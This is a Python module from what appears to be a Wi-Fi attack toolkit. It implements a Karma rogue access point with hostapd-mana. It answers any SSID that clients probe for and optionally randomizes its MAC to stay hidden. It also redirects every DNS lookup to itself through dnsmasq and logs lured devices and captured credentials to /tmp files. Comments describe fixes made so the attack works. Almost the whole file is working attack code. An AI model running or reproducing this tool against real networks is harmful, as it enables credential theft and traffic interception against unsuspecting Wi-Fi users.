"""Karma attack: respond to client probe requests for known SSIDs (PNL
manipulation) and harvest credentials via hostapd-mana."""

import asyncio
import os
import re
import shutil
import secrets
from pathlib import Path

from core.exec_utils import run_command, validate_channel, spawn_with_retry
from core.hardware import start_monitor_mode, stop_monitor_mode, track_process
from core.models import save_result
from core.display import console, info, ok, warn, err, header, StatusLine

CAPTURE_DIR = Path("captures")


async def run_karma_attack(
    mon_interface: str, ap_interface: str, wordlist: str = "",
    portal_template: str = "Generic Cafe", stealth_mac: bool = False,
) -> None:
    header("Karma Attack (PNL Manipulation)")
    if shutil.which("hostapd-mana") is None:
        err("hostapd-mana not found. Install with: sudo apt install hostapd-mana"); return

    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    if ap_interface not in os.listdir("/sys/class/net"):
        err(f"Interface {ap_interface} not found"); return

    mon_mon = await start_monitor_mode(mon_interface)
    ok(f"Probe-sniffing on {mon_mon}")

    await run_command(["sudo", "ip", "link", "set", ap_interface, "down"])
    await run_command(["sudo", "ip", "addr", "flush", "dev", ap_interface])

    if stealth_mac:
        # FIX: a manually-generated random byte string can accidentally set
        # the multicast bit (LSB of the first octet), producing an invalid
        # unicast interface MAC. `macchanger -A` generates a properly
        # formatted random vendor MAC and handles the bit-correctness itself
        # — matches the original web platform's (correct) approach.
        await run_command(["sudo", "macchanger", "-A", ap_interface])
        info("AP interface MAC randomized (macchanger -A)")

    await run_command(["sudo", "ip", "addr", "add", "192.168.50.1/24", "dev", ap_interface])
    await run_command(["sudo", "ip", "link", "set", ap_interface, "up"])

    hostapd_conf = CAPTURE_DIR / "karma_hostapd.conf"
    # FIX: original config key is `mana_enable=1`, not `enable_mana=1` —
    # the wrong key name meant MANA mode (responding to all probed SSIDs)
    # never actually activated; hostapd-mana would have just run as a
    # normal, inert AP. Also FIX: a `ssid=` line is required by hostapd —
    # it was missing entirely, which can prevent the AP from starting.
    # Also restored `mana_responder=1`, `mana_eapsuccess=1`, and
    # `mana_eaptype=AKA` from the original, which broaden which client
    # probe/auth behaviors MANA successfully responds to.
    # FIX (2nd pass): the previous fix guessed `mana_enable=1` based on
    # naming convention, but the user's actual hostapd-mana build rejected
    # it too ("unknown configuration item"), along with `mana_responder`
    # and `mana_eaptype`. Only `mana_wpaout`, `mana_credout`, and
    # `mana_loud` were accepted — hostapd-mana builds clearly vary in which
    # directives they support, so this now uses only the directive set
    # confirmed to work, rather than guessing more names.
    hostapd_conf.write_text(
        f"interface={ap_interface}\n"
        f"driver=nl80211\n"
        f"ssid=FreeWiFi\n"
        f"hw_mode=g\n"
        f"channel=1\n"
        f"mana_wpaout=/tmp/hostapd-mana.credout\n"
        f"mana_credout=/tmp/hostapd-mana.cred\n"
        f"mana_loud=1\n"
    )
    dnsmasq_conf = CAPTURE_DIR / "karma_dnsmasq.conf"
    dnsmasq_conf.write_text(
        f"interface={ap_interface}\n"
        f"dhcp-range=192.168.50.10,192.168.50.100,255.255.255.0,12h\n"
        f"dhcp-option=3,192.168.50.1\n"
        f"dhcp-option=6,192.168.50.1\n"
        f"address=/#/192.168.50.1\n"
    )

    info("Starting hostapd-mana (responds to any probed SSID)...")
    hostapd_proc, started, stderr = await spawn_with_retry(
        ["sudo", "hostapd-mana", str(hostapd_conf)],
        check_seconds=2.0, max_attempts=2, retry_delay=2.0, label="hostapd-mana",
    )
    if not started:
        await stop_monitor_mode(mon_mon)
        err(f"hostapd-mana failed to start after retry. stderr:\n{stderr}")
        return
    track_process(hostapd_proc)

    dnsmasq_proc = await asyncio.create_subprocess_exec(
        "sudo", "dnsmasq", "-C", str(dnsmasq_conf), "--no-daemon",
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
    )
    track_process(dnsmasq_proc)
    ok("Karma AP running. Listening for client associations...")

    connected_clients = []
    try:
        with StatusLine("Listening...") as status:
            while True:
                try:
                    out = await run_command(["sudo", "iw", "dev", ap_interface, "station", "dump"])
                    stations = re.findall(r"Station ([0-9a-fA-F:]{17})", out)
                    for mac in stations:
                        if mac not in [c["mac"] for c in connected_clients]:
                            ssid = "Unknown"
                            cred_file = Path("/tmp/hostapd-mana.cred")
                            if cred_file.exists():
                                for line in cred_file.read_text(errors="replace").splitlines():
                                    if mac.lower() in line.lower():
                                        parts = line.strip().split(":")
                                        if len(parts) >= 2:
                                            ssid = parts[1]
                                        break
                            connected_clients.append({"mac": mac, "ssid": ssid})
                            ok(f"Client connected: {mac} (lured by SSID '{ssid}')")
                            save_result(mac.replace(":", ""), "karma", mac, ssid, "Client connected to rogue AP")
                except Exception:
                    pass
                status.update(f"{len(connected_clients)} client(s) connected")
                await asyncio.sleep(2)
    except (KeyboardInterrupt, asyncio.CancelledError):
        warn("Stopping...")
    finally:
        for p in (hostapd_proc, dnsmasq_proc):
            if p.returncode is None:
                p.terminate()
        await run_command(["sudo", "ip", "addr", "flush", "dev", ap_interface])
        await stop_monitor_mode(mon_mon)
        for f in (hostapd_conf, dnsmasq_conf):
            try:
                f.unlink()
            except Exception:
                pass

    ok(f"Session complete — {len(connected_clients)} client(s) connected.")
    cred_file = Path("/tmp/hostapd-mana.cred")
    if cred_file.exists() and cred_file.stat().st_size > 0:
        info(f"Captured credentials saved at: {cred_file}")
